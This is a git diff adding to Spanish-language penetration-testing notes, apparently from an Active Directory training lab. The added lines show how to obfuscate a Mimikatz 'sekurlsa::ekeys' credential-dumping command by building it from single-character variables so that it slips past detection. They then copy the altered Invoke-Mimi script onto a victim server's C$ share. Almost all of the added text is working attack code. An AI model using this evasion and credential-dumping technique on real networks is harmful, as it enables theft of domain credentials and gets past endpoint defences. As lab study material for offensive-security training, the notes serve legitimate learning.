@@ -217,4 +217,28 @@ No se nos permite ejecutar scripts usando el origen de puntos *. .\Invoke-Mimi.p
 
 Vamos a crear el nuevo *Invoke-Mimi* le llamaremos de la siguiente forma: *Invoke-MimiEX-keys-std97.ps1*
 Primero tendremos que crear una copia del *Invoke-Mimi.ps1* original y cambiarle el nombre a *Invoke-MimiEX-keys-std97.ps1*
-Una vez le hayamos cambiado el nombre le damos clic derecho y editar
+Una vez le hayamos cambiado el nombre le damos clic derecho y editar, tendremos que sustituir el contenido de las ultimas lineas por:
+```shell
+$8 = "s";
+$c = "e";
+$g = "k";
+$t = "u";
+$p = "r";
+$n = "l";
+$7 = "s";
+$6 = "a";
+$l = ":";
+$2 = ":";
+$z = "e";
+$e = "k";
+$0 = "e";
+$s = "y";
+$1 = "s";
+$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
+Invoke-Mimi -Command $Pwn
+```
+
+AHora una vez el archivo modificado lo transferiremos a la maquina victima
+```shell
+Copy-Item C:\AD\Tools\Invoke-MimiEX-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
